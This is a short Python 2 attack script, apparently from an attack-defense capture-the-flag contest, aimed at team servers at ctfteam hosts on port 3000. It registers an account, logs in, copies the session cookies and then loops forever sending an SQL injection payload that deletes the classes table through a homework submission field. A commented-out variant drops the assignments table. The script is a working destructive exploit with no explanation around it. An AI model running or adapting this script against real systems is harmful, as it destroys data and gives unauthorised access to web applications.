import requests

while 1 == 1:
    for i in range(12):
        if i != 3:
            continue
        try:
            site = 'http://ctfteam%d.mit.edu:3000' % (i+2)
            print site
            user_data = {'username' : 'FooBarBaz', 'password' : 'HelloWorld', 'type' : 'student'}
            r = requests.post(site + '/signup/', data=user_data)
            print r.text

            r = requests.post(site + '/login/', data=user_data)
            print r.text
            myCookies = dict()
            myCookies['id'] = r.cookies['id']
            myCookies['login'] = r.cookies['login']
            myCookies['teacher'] = r.cookies['teacher']

            evil = {'assignment' : "Herp'); DELETE FROM classes; --"}
            r = requests.post(site + '/homework/1/', cookies=myCookies, data=evil)
            print r.text

            #evil = {'assignment' : "Herp'); DROP TABLE assignments; --"}
            #r = requests.post(site + '/homework/2/', cookies=myCookies, data=evil)
            #print r.text
        except Exception:
            pass

